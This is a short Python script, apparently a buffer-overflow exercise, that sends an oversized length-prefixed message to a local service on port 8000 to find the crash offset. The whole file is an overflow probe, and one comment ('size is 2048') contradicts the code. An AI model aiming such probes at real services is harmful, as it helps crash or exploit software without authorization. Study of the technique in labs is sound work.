#!/usr/bin/python

import os
import socket
import struct

HOST = '127.0.0.1'
PORT = 8000


def network_order_uint32(value):
    return struct.pack('>L', value)


def get_payload():
        # construct message of size > expected buf size
        # with 4 bytes idicating the size is 2048 in big endian order
    message = 'A' * 1030 + 'abcdefghij' + 'klmn'  # starts seg fault from 'k'
    payload = network_order_uint32(len(message)) + message
    print(len(payload))
    return payload


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
